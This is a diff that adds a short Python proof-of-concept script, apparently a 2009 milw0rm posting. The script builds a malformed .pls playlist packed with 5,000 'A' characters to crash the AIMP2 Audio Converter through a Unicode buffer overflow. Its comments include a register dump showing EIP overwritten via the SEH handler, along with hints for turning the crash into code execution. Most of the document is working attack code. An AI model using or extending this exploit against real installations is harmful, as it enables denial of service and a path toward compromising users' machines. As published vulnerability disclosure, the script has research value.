@@ -1,0 +1,41 @@
+#!/usr/bin/python
+#
+# ######################################################################
+#
+# AIMP2 Audio Converter <= 2.53 (build 330) (.pls/.m3u) Unicode local crash PoC
+# Found & exploited by: mr_me
+# Download: ftp://www.catode.ru/AIMP/aimp_2.51.330.zip
+# Tested on: Wind0ws XP SP3
+# 
+# ######################################################################
+#
+# Unicode overflow, maybe someone with better skills can exploit this 
+# you need to overwrite SEH handler with a CALL EAX 0x00XX00XX instruction.
+# Here is the crash breakdown:
+# 
+# EAX 001B0020 UNICODE "AAAAAAAAAAAAAAAAAAAA~
+# ECX 00000273
+# EDX 00000C4C
+# EBX 00000000
+# ESP 0012DCA8
+# EBP 0012DD64
+# ESI 001B6610 UNICODE "AAAAAAAAAAAAAAAAAAAA~
+# EDI 00130000 ASCII "Actx "
+# EIP 004530C6 AIMP2.004530C6
+#
+# And then when we pass the exemption handler to overwrite EIP...
+#
+# EIP 00410041
+#
+
+header = ("[playlist]\nNumberOfEntries=3\n\n");
+header += ("File1=");
+crash = ("\x41" * 5000);
+
+buffer = header + crash
+file=open('mr_mes_funky.pls','w')
+file.write(buffer)
+file.close()
+print "[+] mr_mes_funky.pls file created successfully"
+
+# milw0rm.com [2009-09-01]
